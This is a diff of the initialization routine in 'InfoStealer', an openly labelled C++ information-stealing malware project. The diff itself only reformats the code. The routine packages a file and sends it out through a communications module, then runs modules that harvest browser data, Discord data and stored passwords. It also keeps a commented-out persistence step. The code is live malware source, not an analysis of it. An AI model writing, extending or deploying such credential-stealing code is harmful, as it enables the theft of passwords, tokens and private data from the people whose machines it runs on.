@@ -1,46 +1,46 @@
-/* 
+/*
 * InfoStealer - Extracts information and interesting files from a target system.
 * Copyright (C) 2023 Sebastian Hasch - <https://github.com/Zelyson/InfoStealer>
-* 
+*
 * This program is free software licensed under the GNU General Public License version 3:
-* you can redistribute it and/or modify it under the terms of the 
+* you can redistribute it and/or modify it under the terms of the
 * GNU General Public License version 3 as published by the Free Software Foundation.
-* 
+*
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/gpl-3.0>.
 */
 
-#include "../../include/modules/initialize.hpp"
+#include "../../include/communication/comms.hpp"
 #include "../../include/modules/browser/browser.hpp"
 #include "../../include/modules/discord/discord.hpp"
+#include "../../include/modules/initialize.hpp"
 #include "../../include/modules/passwords/passwords.hpp"
 #include "../../include/persistance/persistance.hpp"
 #include "../../include/util/serialization.hpp"
-#include "../../include/communication/comms.hpp"
 
 void initialize::init(char* argv) {
-    /*persistance* persist = new persistance(argv);
-    persist->persist(argv);
-    delete persist;*/
+	/*persistance* persist = new persistance(argv);
+	persist->persist(argv);
+	delete persist;*/
 
-    util::Packet *packet = new util::Packet;
-    util::File *file = util::getFile(argv);
-    packet->file = *file;
+	util::Packet* packet = new util::Packet;
+	util::File* file = util::getFile(argv);
+	packet->file = *file;
 
-    comms* com = new comms();
-    com->send_c(*packet);
+	comms* com = new comms();
+	com->send_c(packet);
 
 
 
-    browser* bro = new browser();
-    discord* dis = new discord();
-    passwords* patch = new passwords();
-    bro->dispatch();
-    dis->dispatch();
-    patch->dispatch();
+	browser* bro = new browser();
+	discord* dis = new discord();
+	passwords* patch = new passwords();
+	bro->dispatch();
+	dis->dispatch();
+	patch->dispatch();
 
-    delete bro;
-    delete dis;
-    delete patch;
+	delete bro;
+	delete dis;
+	delete patch;
 }
 
